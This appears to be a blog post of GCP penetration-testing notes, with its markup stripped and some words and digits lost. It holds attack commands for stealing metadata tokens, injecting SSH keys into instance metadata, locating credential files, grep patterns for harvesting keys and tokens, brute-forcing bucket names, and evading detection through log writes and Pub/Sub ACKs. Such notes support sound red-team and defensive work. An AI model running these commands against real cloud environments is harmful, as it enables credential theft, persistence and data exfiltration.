class Service Accounts h ul id bacd b f af f f ed class bulleted list li style list style type disc every GCP project has a default service account ul id d d e d e e cb b d a class bulleted list li style list style type circle this service account gets assigned to any resource created within that project as well li ul li ul p id e a c ad d b fc fd f aa f class Default service accounts look like the following p pre id f f f e b da adf a c class code code PROJECT NUMBER compute developer gserviceaccount com PROJECT ID appspot gserviceaccount com code pre p id a e faf f a e cdc f db class Custom service accounts look like the following p pre id ae d ded e aa f c f class code code SERVICE ACCOUNT NAME PROJECT NAME iam gserviceaccount com code pre h id bc a de d e a aca a class Access Scopes h ul id f ee c eb e f f b class bulleted list li style list style type disc the access scope of a service account can be seen by querying the code code IP such as in the example below li ul pre id b b a d f e a e fae aaebd d class code code curl http metadata google internal computeMetadata v instance service accounts default scopes   H x Metadata Flavor Google x   https www googleapis com auth devstorage read only https www googleapis com auth logging write https www googleapis com auth monitoring write https www googleapis com auth servicecontrol https www googleapis com auth service management readonly https www googleapis com auth trace append code pre ul id f c e e a ea efc class bulleted list li style list style type disc the code devstorage read only code default scope allows read access to all storage buckets within the specified project li ul ul id d d b a e c b eddfe df de class bulleted list li style list style type disc access scopes should not be relied on as a boundary for a service account s permissions li ul ul id dea a e cb fc a ab ec d class bulleted list li style list style type disc when code cloud platform code is specified for an instance the service account can attempt to authenticate to all API endpoints ul id b ce d d e b afd af bed fef d class bulleted list li style list style type circle this authentication will be successful if the permissions of the storage account allow it li ul li ul ul id bc b d c b cc d b a class bulleted list li style list style type disc even though a service account may have permissions to access a certain API endpoint if this endpoint is not allowed by the access scope successful authentication cannot occur li ul h id fae f a a d fac cfc b class IAM h p id deaefd d b b c e a f class span style border bottom em solid Primitive roles span p ul id af edca ce b bf f c fd class bulleted list li style list style type disc code Owner code code Editor code and code Viewer code li ul ul id c a a a af ebcd a class bulleted list li style list style type disc default service account in every project is given the code Editor code role insecure li ul p id bb c d dfdc a a e f cc afd class span style border bottom em solid Predefined roles span p ul id c fd d d b e b b bb class bulleted list li style list style type disc roles managed by Google e g code compute instanceAdmin code li ul p id f f f a a aa b c class span style border bottom em solid Custom roles span p ul id e b a b c b f b a e class bulleted list li style list style type disc provides admins the ability to create their own set of permissions for a role li ul p id a f d a b bac e d b f class To see roles assigned to each member of a project p p id c f d b b f a e fad f d class code gcloud projects get iam policy lt PROJECT ID gt code p h id d a e e b b b d af fc fe class Enumeration h table id a df d b c dcab class simple table tbody tr id a ba cc b d fa f dce d b td id q W class style width px strong Command strong td td id YRRn class style width px strong Description strong td tr tr id a cc e a e b d be dc f td id q W class style width px code gcloud organizations list code td td id YRRn class style width px Get organization ID td tr tr id c b c a c f adf b c c td id q W class style width px code gcloud organizations get iam policy code td td id YRRn class style width px View user permissions within organization td tr tbody table ul id e d ac a ed cb a e bc a f b class bulleted list li style list style type disc note that the permissions within an organization are applied to all projects within the organization which are therefore applied to all resources within that project etc li ul h id d bafd db a fa e a ddd class Application Default Credentials h h id cd d a aa f e e class Service Account Token h p id e a dea df ab b f class Token can be retrieved from metadata service p p id f dd d b f fabf e c class strong Request strong p pre id a a f e ed d a be class code code curl quot http metadata google internal computeMetadata v instance service accounts default token quot H quot Metadata Flavor Google quot code pre p id f ba d c e fb a class strong Response strong p pre id bedc c c b e d f aa c ac class code code wrap code   quot access token quot quot ya AHES ZRN HlhAPya GnW bHSb QtAS i nHq HE C LTrCARA quot   quot expires in quot   quot token type quot quot Bearer quot   code pre h id beade d a b ef class Application Default Credentials h ul id ea d e d c b e c e b e e class bulleted list li style list style type disc alternative to pulling a token from the metadata service ul id d d ad a a a class bulleted list li style list style type circle this method is used when implementing one of Google s official GCP client libraries li ul li ul p id b d e ed bb a b e fe c d class The following are the steps taken to search for credentials when using the GCP client libraries p ol type id d a cba ae dfd b c a d class numbered list start li Code will check source code ol type a id f a d ff ef a addf f b a class numbered list start li The service account key file is checked li ol li ol ol type id a fd e a e e eb class numbered list start li The code GOOGLE APPLICATION CREDENTIALS code environment variable is checked ol type a id c c a f e b d c aa class numbered list start li This environment variable can be set to the location of a service account key file li ol li ol ol type id ff e eb d b a e bd dc f e class numbered list start li The default token in the metadata service is used li ol ul id e a ebdf a b ec class bulleted list li style list style type disc the default token in the metadata service is used only if or is not found because the metadata service token is confined within access scopes and is temporary li ul h id a a f e c e f d be class Privilege Escalation h p id b abc d c dd b d dd ee class Always make sure to check if the principle of least privilege is being applied throughout the environment p h id a a b ad f a bea b d a a class SSRF h p id c fb af c f be cd e af class The privesc techniques described below are written from the perspective of internal access to a compromised instance However they can also be performed if you find SSRF in some cases p h id ec b bd b e ba f abfdd class Insecure Metadata Endpoint h p id bca d e f d class If the client has a code v beta code enabled you can get the access token without the special header p pre id dc dae daf df acf c e de class code code curl http metadata google internal computeMetadata v beta instance service accounts default token code pre p id e add a d a ae ba class Otherwise you must query code a href http metadata google internal computeMetadata v beta instance service accounts default token http metadata google internal computeMetadata v instance service accounts default token a code with a custom header set p ul id cece f ef c bb b d class bulleted list li style list style type disc note the authorization token expires within hour by default li ul h id e a e dab e a b fd af class Compute Instances h h id a f a babb c e a a class General h ul id ebdfb df ac a f cf class bulleted list li style list style type disc just because an access scope blocks a certain command does not mean that any variations of that command cannot be run ul id c a b bec af ff e a e class bulleted list li style list style type circle e g if code gsutil ls code returns no storage buckets you may still be able to query a storage bucket by specifying the name of the bucket for example code gsutil ls gs storage bucket example code li ul li ul p id cf e f b d e bbdc b class Enumerate scripts within the following areas div class indented ol type id d f dae d cf b b fa class numbered list start li Instance metadata li ol ol type id f ac aba aa bf bd class numbered list start li Local filesystem li ol ol type id ed c eff b fee f d c class numbered list start li Service unit files li ol ol type id ea a fe c e aaa class numbered list start li etc li ol div p ul id cb d a f f a d e c c e class bulleted list li style list style type disc scripts help tell what the instance is meant for and what it has access to li ul h id d d bbaf c e ecabe a class Modifying Instance Metadata h p id ab f ce e b d f cefa d class strong Default Service Account strong p p id d f c ea ca ddf d class The following access scopes are offered for default service accounts div class indented ol type id d b e a f dc eeaacb class numbered list start li Allow default access default li ol ol type id f e b d d de d class numbered list start li Allow full access to all Cloud APIs li ol ol type id fd bff d c e a fd e e class numbered list start li Set access for each API li ol div p ul id b f b b e b bd d d class bulleted list li style list style type disc if with compute API access or is enabled privesc is potentially possible li ul p id cb f a b adbcb ffd c class   p p id bc c cd f f a d class strong Custom Service Account strong p ul id bf eb a be bb cb class bulleted list li style list style type disc Google discourages using access scopes for custom service accounts li ul p id ff a ff a a a a a c class One of the following privileges necessary for privesc div class indented ol type id f d d a b ba d fc e class numbered list start li code compute instances setMetadata code li ol ol type id e c f b ab f b c ee class numbered list start li code compute projects setCommonInstanceMetadata code li ol div p p id b e ad f aa c ef d a class It is necessary to be able to authenticate to either a href https www googleapis com auth compute code https www googleapis com auth compute code a or code https www googleapis com auth cloud platform code p p id bf a cfe e abb a e a class   p p id f b ba babe e fff af class span style border bottom em solid Adding SSH Key to Metadata span p ul id f efa d d d f a f d c class bulleted list li style list style type disc Linux GCP systems typically run Python Linux Guest Environment within Compute Engine scripts ul id f a e bd c df c a class bulleted list li style list style type circle account daemon queries metadata for changes to authorized SSH keys and will add a new key to an existing user or a user with code sudo code rights li ul ul id a af c a aa ccc class bulleted list li style list style type circle if custom project metadata can be modified persistence is established on all systems within the GCP project running the accounts daemon code Block project wide SSH keys code option enabled li ul li ul p id b cec f c e b e d f d afdc class span style border bottom em solid Adding SSH Key to Existing Privileged User span p p id fc a f be a b dd f c class code gcluod compute instance describe lt INSTANCE gt zone lt ZONE gt code p p id ca dd b abac d b class This returns something like the following p pre id a a e cebe a class code code wrap code   key ssh keys  value   high priv user ssh rsa AAAAB NzaC yc EAAAADAQABAAABAQC SQup eHdeP qWQedaL vc j hUUtMMvNALmiPfdVTAOIStPmBKx eN ozSySm wFFsMNGXPp ddlFQB pYKYQHPwqRJp CTPpwti uPA ZHcz gJmyGsYNloT DNdAuZybkpPlpHH iMaurjhPk wMQAMJUbWxhZ TTTrxyDmS BnO AgrL aK peoZIwq PLMmikRUyJSv cTX PlQ H MtDHIvl X Al JDXQ Qhm faui AnS usl VcwLOw aQRRUgyqbthg jFAcjOtiuhaHJO G Jw Cp iy NE wT tj smE oTPhdI TXMJdcwysgavMCE FGzZ high priv user  low priv user ssh rsa AAAAB NzaC yc EAAAADAQABAAABAQC fNZlw d mIAcfRV bmIrOUn l qgOGj LQgOTBPLAVMDAbjrM SIa NainYfPSK oh s xi B IzECrwqfwqX Z VbW oQbnlaBz AYwgGHE Fdrbk code pre ol type id a b f a aa f b f bd class numbered list start li Create a key for code high priv user code ol type a id a dad e a d e ce d eb class numbered list start li code ssh keygen t rsa C quot high priv user quot f key P quot quot code li ol li ol ol type id f d b a c bc a class numbered list start li Edit the public key so that it matches the format of the code high priv user code public key file li ol ol type id e dbbe d f cb a bda fbcdbb class numbered list start li Add the new key to the instance metadata ol type a id f e e e cb dcebd d b class numbered list start li code gcloud compute instances add metadata lt INSTANCE gt metadata from file ssh keys ssh public file txt code li ol li ol p id c bd d b bd f cc class   p p id f b e b be fd a da class span style border bottom em solid Creating New User with SSH Key span p ul id c b a d a f c ce db class bulleted list li style list style type disc the same process can be used however a new username should be specified li ul ul id b bee fc a b e e bfa class bulleted list li style list style type disc this gives the new user code sudo code permissions li ul p id f e be e e c ba d class   p p id a dcb b e a b d a f f class span style border bottom em solid Sudo to Existing Session span p p id b ede c d b c f fba class Use the following command to generate a new SSH key add your current username to code google sudoers code group and initiate an SSH session p p id ad a f e b a fa f b class code gcloud compute ssh lt INSTANCE NAME gt code div class indented ul id e b e e ad aa afcf a fb ea class bulleted list li style list style type disc note this may cause more changes to the target instance s metadata than the manual step by step process described above li ul ul id c f b b d f a e class bulleted list li style list style type disc this uses your current username li ul div p p id cad a e e d a ee b ee class   p p id b b a e fb d dc b f c class strong strong span style border bottom em solid OS Login span p ul id b aa bd e dffe class bulleted list li style list style type disc links Google user or service account to Linux identity li ul ul id b dd d c ea db class bulleted list li style list style type disc IAM permissions dictate the authorization of this request li ul ul id fb d ba f b e c f f d class bulleted list li style list style type disc enabled at project or instance level with the metadata key of code enable oslogin TRUE code li ul ul id d c fad f d ec a class bulleted list li style list style type disc FA OS login enabled with code enable oslogin fa TRUE code li ul ul id e ecddf d b e a dd eeda ac c class bulleted list li style list style type disc code roles compute osLogin code and code roles compute osAdminLogin code control SSH access to instances with enabled OS Login ul id f d fe f a d fe class bulleted list li style list style type circle note the former is without sudo access while the latter is with sudo access li ul li ul p id d a e a f d a c eb b b class   p ul id d c eedf f a b dc bd c class bulleted list li style list style type disc by adding one s SSH key to the project metadata access to all instances can be achieved as long as the instance does not have the code Block pojrect wide SSH keys code option enabled p id c ae fb e cab da fdfb class code gcloud compute project info add metadata metadata from file ssh keys my public ssh key txt code p li ul h id bd db b a f b f c ddcf d class Bypassing Access Scopes h p id fe c a c a ace f e b dd class mark class highlight orange Access scopes are not a security mechanism stated by Google themselves mark p p id a e cec beae fabc c c f class strong Find Token Access Scopes strong p pre id d cd c d f ddc c e class code code wrap code TOKEN x gcloud auth print access token x  curl https www googleapis com oauth v tokeninfo access token TOKEN code pre ul id ebe a df c d a e class bulleted list li style list style type disc access scopes have no effect when making requests not authenticated through OAuth ul id a f c ec b cb ba fa a b b class bulleted list li style list style type circle search for an RSA private key to authenticate to the Google Cloud API and request a new OAuth token p id e cbd e db a f d f f e class code gcloud auth activate service account key file lt FILE gt code p li ul li ul p id ed ace f f cb d class   p p id ac e ad d c e c e b class strong Check for Service Accounts with Exported Key Files strong p pre id b f c b ed ae d class code code for i in gcloud iam service accounts list format quot table no heading email quot do  echo Looking for keys for i   gcloud iam service accounts keys list iam account i done code pre ul id bcf c b cb b baa ec class bulleted list li style list style type disc default name for service account key file is code lt PROJECT ID gt lt PORTION OF KEY ID gt json code li ul p id f f e c b bfac e class   p ul id b e d e acc b class bulleted list li style list style type disc if access scopes are too restrictive check if there is another instance that is more permissive ul id f f c cff bbc ec dd class bulleted list li style list style type circle code gcloud compute instances list quiet code li ul li ul ul id e aeb e b ff ef b e class bulleted list li style list style type disc check if an instance has the default service account code PROJECT NUMBER compute developer gserviceaccount com code li ul p id ba af b cf a a ac e fd class   p h id c afa c f da b aae a e fd class Steal GCloud Authorizations h ul id dc e e be c d fc c class bulleted list li style list style type disc look for the following files li ul pre id b bb e b d b c c class code code config gcloud credentials db  config gcloud legacy credentials ACCOUNT adc json  config gcloud legacy credentials ACCOUNT boto  credentials json code pre h id e f fc f b e b ac f ee d d class Service Account Impersonation h p id f ad e e a f f b f class Three ways to impersonate a service account p ol type id acde c b e bdec ee e ce class numbered list start li Authentication using RSA private keys li ol ol type id a ca a aa a b f f ef f class numbered list start li Authorization using Cloud IAM policies li ol ol type id a c b c bfec e f bc d class numbered list start li Deploying jobs on GCP services li ol p id c cd e e f ba ca class   p ul id e e e b c class bulleted list li style list style type disc can potentially impersonate another account with the code iam serviceAccountTokenCreator code permission li ul ul id d bd c f b ffdc a class bulleted list li style list style type disc if you have code Owner code access you can try logging into the web interface ul id b c b ae d f eedf e ac class bulleted list li style list style type circle service accounts can t access web interface but you can provide code Editor code access to any arbitrary code gmail com code account and then login can t provide code Owner code access li ul pre id d b b b a afca d class code code wrap code gcloud projects add iam policy binding lt PROJECT gt member user xd y gmail com role roles editor code pre li ul ul id dc d c f d af bfea f class bulleted list li style list style type disc you can use code impersonate service account code flag to execute a command using the specified service account ul id c b e b a class bulleted list li style list style type circle For example code gcloud compute instances list impersonate service account lt SERVICE ACCOUNT gt code li ul li ul h id aecfdcf ac fce a fe b c a class Accessing Databases h ul id f bac a d aee b d class bulleted list li style list style type disc check database backups in storage buckets and of course check other juicy information within instances li ul ul id fe e e fef cae d cd class bulleted list li style list style type disc some code gcloud code commands are made specifically for exporting data ul id fd da a d d b a class bulleted list li style list style type circle need to write database to storage bucket first before downloading it li ul li ul p id c fa a f ad af e class strong Finding databases across project strong p pre id d fe bc b c f b b class code code wrap code Cloud SQL   gcloud sql instances list gcloud sql databases list instance INSTANCE   Cloud Spanner   gcloud spanner instances list gcloud spanner databases list instance INSTANCE   Cloud Bigtable   gcloud bigtable instances list code pre h id dfe ef ff a b a e b b class Storage Buckets h ul id e a f a b ed e c d class bulleted list li style list style type disc note that default instance permissions allow read access to storage buckets li ul ul id afa f d f e b de ba class bulleted list li style list style type disc can be found with wordlists source code etc li ul ul id bef fad b f b e class bulleted list li style list style type disc use code gsutil code to interact with storage buckets li ul ul id a a c b a ca cee f class bulleted list li style list style type disc if code gsutil ls code returns access denied access to storage buckets is still potentially possible but requires the bucket name to be specified li ul p id e e aa b c a b f bd e c class   p p id ae d a bab ae f bf a c class strong Bash Oneliner for Bruteforcing Bucket Names strong p p id cbe cf a b dc dc class code for i in cat wordlist txt do gsutil ls r gs quot i quot done code p h id e f fb eb b b fae class Decrypting Secrets h ul id ae ff e a b b c class bulleted list li style list style type disc cryptographic keys stored within Cloud KMS Key Management Service li ul ul id c b ef e b d dda aa class bulleted list li style list style type disc individual keys stored in key rings li ul h id dae a a c c c a ab c class Enumeration h ul id eec a a ee d c f d class bulleted list li style list style type disc without GCloud enumeration permissions try searching for keys in documentation scripts and bash history li ul table id c d d c fa d a b d a d a d class simple table tbody tr id a b ff a c bd td id rU e class style width px strong Command strong td td id lt V class style width px strong Description strong td tr tr id e c fa e d a f c e d c td id rU e class style width px code gcloud kms keyrings list location global code td td id lt V class style width px Lists global keyrings available td tr tr id be e e ea f a c d ce dbdf td id rU e class style width px code gcloud kms keys list keyring lt KEYRING NAME gt location global code td td id lt V class style width px Lists keys inside a keyring td tr tr id c e dc b c e aa bd td id rU e class style width px code gcloud kms decrypt ciphertext file lt INFILE gt plaintext file lt OUTFILE gt key lt KEY gt keyring lt KEYRING gt location global code td td id lt V class style width px Decrypts file using a key td tr tbody table h id b dfdcd b be b cde a class Serial Console Logs h ul id ac e a bd e d cb class bulleted list li style list style type disc output from compute instances written from OS and BIOS to serial ports li ul p id c f bee bf e b daea class Two ways to view the log files from the serial ports p ol type id a ed d b a a f de b class numbered list start li Via Compute API ul id dabfc d f f aac ab b fdf class bulleted list li style list style type disc can be executed even with the code Compute Read Only code access scope restriction li ul ul id fe c d af b a class bulleted list li style list style type disc code gcloud compute instances get serial port output lt INSTANCE NAME gt port lt PORT gt start start zone lt ZONE gt code li ul li ol ol type id a b f c d a bfe ccc d class numbered list start li Via Cloud Logging ul id b f f ee d db f b class bulleted list li style list style type disc serial logs stored in Cloud Logging if enabled by admin li ul ul id a dc a ab d ee d d b class bulleted list li style list style type disc can be accessed with logging read permissions li ul li ol h id e e dd b bf b d class Custom Images h ul id d e cf cf f aa b fce class bulleted list li style list style type disc some images may contain sensitive information which you can exfiltrate and use for a new VM li ul p id d b a ca b b de b a d class strong Find List of Custom Images strong p p id a bcf c aeaa aa df e class code gcloud compute images list no standard images code p p id c b cdba d a f class strong Export Images strong p p id f a a b f bea class code gcloud compute images export image lt IMAGE NAME gt export format qcow destination uri lt BUCKET gt code p h id bf e b a a bf a df bf e class Custom Templates h ul id e f e f b a e c class bulleted list li style list style type disc instance templates allow deployment of VMs with specific configurations ul id e f a c aa b bc b ac f c class bulleted list li style list style type circle these configurations can tell the VM which image to use startup script labels etc li ul li ul table id e f c eff d fe b a ac class simple table tbody tr id b b c ae a b a td id vzy class style width px strong Command strong td td id CrAN class style width px strong Description strong td tr tr id e bca f e c b c d b a td id vzy class style width px code gcloud compute instance templates list code td td id CrAN class style width px Lists available templates td tr tr id c d e cd acb fed td id vzy class style width px code gcloud compute instance templates describe lt TEMPLATE NAME gt code td td id CrAN class style width px Get details of specific template td tr tbody table ul id b fa fa d f da d a class bulleted list li style list style type disc a template can include sensitive data that can be discovered via the instance metadata li ul h id fea e c e e a a a d fa class StackDriver Logging h ul id f db f a e fb a b class bulleted list li style list style type disc StackDriver is a Google monitoring and logging service ul id fa b b da b d c e class bulleted list li style list style type circle Google s equivalent of AWS CloudWatch and CloudTrail li ul li ul ul id d fdeb f ea a b ae f class bulleted list li style list style type disc compute instances require code write code access to write to log files however if code read code permissions are also granted then logs can be read li ul table id a fd a dab a d f class simple table tbody tr id b d e b d aa td id h JN class style width px strong Command strong td td id gZ class style width px strong Description strong td tr tr id ecaf d c f e ccf fc td id h JN class style width px code gcloud logging logs list code td td id gZ class style width px Lists log folders in current project td tr tr id f a ec f ca d e d c td id h JN class style width px code gcloud logging read lt LOG FOLDER gt code td td id gZ class style width px Read contents of specific log folder td tr tr id d c d ba de f b ba a td id h JN class style width px code gcloud logging write lt LOG FOLDER gt lt MESSAGE gt code td td id gZ class style width px Write arbitrary data to a specific log folder Can be used for distraction td tr tbody table h id be d b fcb d a fc cc class Serverless Services h h id da fb cb bd bd aa fa class Cloud Functions h ul id cc ae b d a f a bf f e class bulleted list li style list style type disc AWS Lambda equivalent li ul ul id c a bb d ea a class bulleted list li style list style type disc environment variables can contain secrets just like in AWS li ul table id a c e c c f d bce class simple table tbody tr id c b f d a a f bf f f td id h JN class style width px strong Command strong td td id gZ class style width px strong Description strong td tr tr id e ab d d ad db d f bd td id h JN class style width px code gcloud functions list code td td id gZ class style width px Lists available cloud functions td tr tr id ef acc b c ee e abb td id h JN class style width px code gcloud functions describe lt FUNCTION NAME gt code td td id gZ class style width px Display function configuration and defined environment variables td tr tr id a c b c cb fb f c d td id h JN class style width px code gcloud functions logs read lt FUNCTION NAME gt code td td id gZ class style width px Get logs of the function executions td tr tbody table h id a c c b d ab class App Engine h ul id f d dc a e e dfe e class bulleted list li style list style type disc Google App Engine is a serverless cloud computing platform focusing on scalability li ul ul id d fe da c a f b c cd d class bulleted list li style list style type disc secrets can be stored in environment variables table id a fb f b b d class simple table tbody tr id f c bd e facab eef td id h JN class style width px strong Command strong td td id gZ class style width px strong Description strong td tr tr id dba f d a b c b td id h JN class style width px code gcloud app versions list code td td id gZ class style width px Lists existing versions for all services in the App Engine server td tr tr id aed c f acac b cf d td id h JN class style width px code gcloud app describe lt APP gt code td td id gZ class style width px Displays information about a specific app td tr tbody table li ul h id bd ba d bbda b a cebd c class Cloud Run h ul id a e e cf a a f ad class bulleted list li style list style type disc check environment variables for secrets li ul ul id b f d eec a e class bulleted list li style list style type disc opens web server on port and waits for HTTP GET request ul id a cc ada cde fcf ba b b class bulleted list li style list style type circle upon receiving such a request a job is executed which is logged and outputted via an HTTP response li ul li ul ul id cac c c bc b e ab e ee class bulleted list li style list style type disc jobs run in Kubernetes clusters either fully managed by Google or partially managed through a href https cloud google com anthos Anthos a ul id c a de f b f adf ff class bulleted list li style list style type circle can be configured with IAM permissions to control which identities can start the job li ul ul id b e eaf bef b d class bulleted list li style list style type circle can be configured to be unauthenticated allowing anyone with the URL to trigger the job and view the log output li ul li ul ul id b b e d f cf a c class bulleted list li style list style type disc mark class highlight orange be careful about what those jobs do because it could affect production mark li ul table id f b c cc f f e c a e c class simple table tbody tr id fad a ecf d dd a e td id h JN class style width px strong Command strong td td id gZ class style width px strong Description strong td tr tr id b a de a d e bbb dee td id h JN class style width px code gcloud run services list platform managed format json code   code gcloud run services list platform gke format json code td td id gZ class style width px Lists services across available platforms td tr tr id afc ba d b efae c td id h JN class style width px code curl lt URL gt   code code curl H quot Authorization Bearer gcloud auth print identity token quot lt URL gt code td td id gZ class style width px Attempt to trigger a job as an unauthenticated user  Trigger a job as authenticated user td tr tbody table h id f cbd f a a f bbd fc e class AI Platform h ul id a c c bb f e e befc class bulleted list li style list style type disc look for models and jobs li ul table id a e a c f c e class simple table tbody tr id d ec e cd be a dc af c dce td id h JN class style width px strong Command strong td td id gZ class style width px strong Description strong td tr tr id b a af aca d d d td id h JN class style width px code gcloud ai platforms models list format json code td td id gZ class style width px Lists models td tr tr id e ebe cde db a fa e td id h JN class style width px code gcloud ai platform jobs list format json code td td id gZ class style width px Lists jobs td tr tbody table h id e c e b a d dfac class Cloud Pub Sub h ul id e c c b a f a c class bulleted list li style list style type disc service allowing applications to send messages between each other li ul p id b cdb dcb c a da eb f class Pub Sub is made up of the following p ol type id c c e ba bde f class numbered list start li Topic logical group of messages li ol ol type id fb e c c be d class numbered list start li Subscriptions Allows applications to receive a stream of messages related to a topic which can be enabled via push notifications for some Google services or pull requests for custom services li ol ol type id e c d d a f ed ad b class numbered list start li Messages data optionally metadata as well li ol table id f e a c ba bf f class simple table tbody tr id d ca e a dc d d td id h JN class style width px strong Command strong td td id gZ class style width px strong Description strong td tr tr id b f f b c ad f d b ccb td id h JN class style width px code gcloud pubsub topics list code td td id gZ class style width px Lists topics in project td tr tr id eb d bd a fa f c b td id h JN class style width px code gcloud pubsub subscrpitions list format json code td td id gZ class style width px Lists subscriptions for all topics td tr tr id d ba d fde ad b c b c td id h JN class style width px code gcloud pubsub subscriptions pull lt SUBSCRIPTION NAME gt code td td id gZ class style width px Pulls one or more messages from a subscriptions td tr tbody table ul id ea a f bd a fc a class bulleted list li style list style type disc modification of messages can change behavior of application depending on how the application interacts with the messages li ul ul id f bce fbb d b c a e a c class bulleted list li style list style type disc the pull command could be used to mimic valid applications ul id af daaf d b ed d e f e class bulleted list li style list style type circle some messages can be requested that have not yet been delivered li ul ul id f de f b af e d b d class bulleted list li style list style type circle this command should not send an ACK back and should not impact other apps li ul li ul ul id cdcc e d bf b b b d be class bulleted list li style list style type disc an attacker can ACK a message before it is received by the app to avoid some detection li ul ul id eacb b fea ea bca b bafc class bulleted list li style list style type disc asking for large sets of data could impact applications be careful li ul h id cc ada a bd cb ef ca class Cloud Source Repos h ul id d c d b d a e a f c f e class bulleted list li style list style type disc designed like Git so li ul ul id b b cc b a b b dca b c class bulleted list li style list style type disc can contain juicy info li ul table id d d a a a ec b b class simple table tbody tr id a da da ca de c f b c td id h JN class style width px strong Command strong td td id gZ class style width px strong Description strong td tr tr id cda eeb d f b af f b cee td id h JN class style width px code gcloud source repos list code td td id gZ class style width px Enumerate available repos td tr tr id f a ff b a ac fe fea fd td id h JN class style width px code gcloud source repos clone lt REPO NAME gt code td td id gZ class style width px Clone a repo td tr tbody table h id c c c ff b b f a a class Cloud Filestore h ul id e e e a f a d d f be class bulleted list li style list style type disc database designed for storing small documents li ul ul id c f c d b a f c e class bulleted list li style list style type disc like AWS DynamoDB li ul ul id eaf c b d f ec ec class bulleted list li style list style type disc filestores can be mounted li ul p id b f bf b a deb c d b class strong List Filestore Instances strong p p id cb b f b a f de ec class code gcloud filestore instances list format json code p h id e f d aa d e a a eda beffb class Kubernetes h ul id ce e b e ea e a c fd class bulleted list li style list style type disc container service for scaling management and software deployment li ul table id e c f ac c bca ee faf d class simple table tbody tr id e f dd f ea ad ac ae td id h JN class style width px strong Command strong td td id gZ class style width px strong Description strong td tr tr id d e d b cdfe td id h JN class style width px code gcloud container clusters list code td td id gZ class style width px List container clusters in current project td tr tr id c ed b aa bd d cbfaffe c f td id h JN class style width px code gcloud container clusters get credentials lt CLUSTER NAME gt region lt REGION gt code td td id gZ class style width px Authenticates your code kube config code file to include the cluster so that you can use code kubectl code td tr tr id e f c c a de f faf ba td id h JN class style width px code kubectl cluster info code td td id gZ class style width px Get information about the cluster td tr tbody table p id c d b a cb b ea cb db class Kubectl cheat sheet a href https kubernetes io docs reference kubectl cheatsheet https kubernetes io docs reference kubectl cheatsheet a p h id f c d e a d ef f class Secrets Management h ul id bb f fb f b ea cc fcd class bulleted list li style list style type disc stores passwords API keys certificates etc li ul table id d f d f bd dacd class simple table tbody tr id a c d cc a f b bfdbbcd td id h JN class style width px strong Command strong td td id gZ class style width px strong Description strong td tr tr id c c e cb d de ec dc td id h JN class style width px code gcloud secrets list code td td id gZ class style width px Lists secrets in vault td tr tr id a eb fc bb a a b cbdc b td id h JN class style width px code gcloud secrets describe lt SECRET gt code td td id gZ class style width px Get the value of the secret td tr tbody table h id dfd ccbc f d ae a fce b b b class Local System Secrets h ul id f b d e c f d e a d a class bulleted list li style list style type disc with internal access to a system search temporary directories history files environment variables scripts etc li ul pre id febc b a df ca c b f class code code wrap code TARGET DIR quot path to whatever quot    Service account keys grep Pzr quot s service account private key quot   quot TARGET DIR quot    Legacy GCP creds grep Pzr quot s client id client secret quot   quot TARGET DIR quot    Google API keys grep Pr quot AIza a zA Z quot   quot TARGET DIR quot    Google OAuth tokens grep Pr quot ya a zA Z quot   quot TARGET DIR quot    Generic SSH keys grep Pzr quot s BEGIN A Z PRIVATE KEY a zA Z n END A Z PRIVATE KEY quot   quot TARGET DIR quot    Signed storage URLs grep Pir quot storage googleapis com Goog Signature a f quot   quot TARGET DIR quot    Signed policy documents in HTML grep Pzr x s lt form action googleapis com name quot signature quot value quot quot gt x   quot TARGET DIR quot code pre h id f e e c d ad c f e class Networking h h id e e de beee c d c class Firewall h ul id cfe d c be e b class bulleted list li style list style type disc every project is given a default VPC which contains the following rules for all instances ol type id a df d c ae b b class numbered list start li code default allow internal code allows all traffic from other instances on the same network li ol ol type id a f ab ac a cf class numbered list start li code default allow ssh code allows port traffic from everywhere li ol ol type id eff b e d f c class numbered list start li code default allow rdp code allows port traffic from everywhere li ol ol type id bdf d b e af c class numbered list start li code default allow icmp code allows ping from everywhere li ol li ul h id e fc e c bb d ee b f class Enumeration h p id a a f b be ce dd be ce class View all subnets in current project p p id f aea f e ce a caf class code gcloud compute networks subnets list code p p id ceaa aa f f cbd a f a d class View all internal external IP addresses in project p p id eec faf e e bc b class code gcloud compute instances list code p p id aaf e c bd bd d class View open ports of all instances p ul id e b f f b b fe class bulleted list li style list style type disc strong mark class highlight orange Running nmap from within an instance can trigger an alert mark strong ul id fdcc b e c c e c class bulleted list li style list style type circle likelihood of trigger increases if scanning public IP addresses outside of current project li ul li ul ul id cc f c fdd b d d d fad class bulleted list li style list style type disc there may be an insecure application that can be exploited to achieve elevated access li ul ul id f e db c febfddef class bulleted list li style list style type disc port enumeration should be interpreted by viewing firewall rules network tags service accounts and instances within a VPC see a href https gitlab com gitlab com gl security threatmanagement redteam redteam public gcp firewall enum gcp firewall enum a li ul p id c c e ce a c a c class   p h id f ef b a d b c class G Suite h ul id eb b b c cdb d f class bulleted list li style list style type disc uses completely different API from Google Cloud li ul ul id d b cbf f a d class bulleted list li style list style type disc GCP service accounts can access G Suite data using domain wide delegation ul id a a eca bb d a e e b aa class bulleted list li style list style type circle can be viewed in the web interface via IAM Service Accounts li ul li ul h id f bce ad b dc a d aee class Authenticating to G Suite h ul id d fafc c d a fb a a class bulleted list li style list style type disc need exported service accounts credentials in JSON format li ul ul id b b d de a f dc e class bulleted list li style list style type disc service accounts cannot authenticate to G Suite and therefore you need to impersonate valid G Suite users ul id c b e f c f a fbac class bulleted list li style list style type circle see a href https gitlab com gitlab com gl security threatmanagement redteam redteam public gcp misc blob master gcp delegation py gcp delegation a li ul li ul h id bc a ee b d c bd d f class Tools h p id c ed ff b c bce c f f class a href https gitlab com gitlab com gl security threatmanagement redteam redteam public gcp firewall enum gcp firewall enum a p ul id c bfc eb d a c bd dd c class bulleted list li style list style type disc port scans for compute instances exposed to the internet li ul p id de f b c b e e b e a class a href https gitlab com gitlab com gl security threatmanagement redteam redteam public gcp enum gcp enum a p ul id df e d beb b d e e fb efe class bulleted list li style list style type disc script full of enumeration commands li ul p id b ef aa aad cc f class a href https gitlab com gitlab com gl security threatmanagement redteam redteam public gcp misc gcp misc a p ul id e f cb ae c d d class bulleted list li style list style type disc a collection of tools for attacking GCP environments li ul ul id b dc a a b ccd c e class bulleted list li style list style type disc contains a href https gitlab com gitlab com gl security threatmanagement redteam redteam public gcp misc blob master gcp delegation py gcp delegation a for listing user directory and creating a new admin account li ul p id a d ce a a f c d class   p div article body html",
				"image": "/images/GCP-Penetration-Testing-Notes.jpg"
		},

    {
      "title"    : "Hands on AWS Penetration Testing Notes",
      "category" : "",
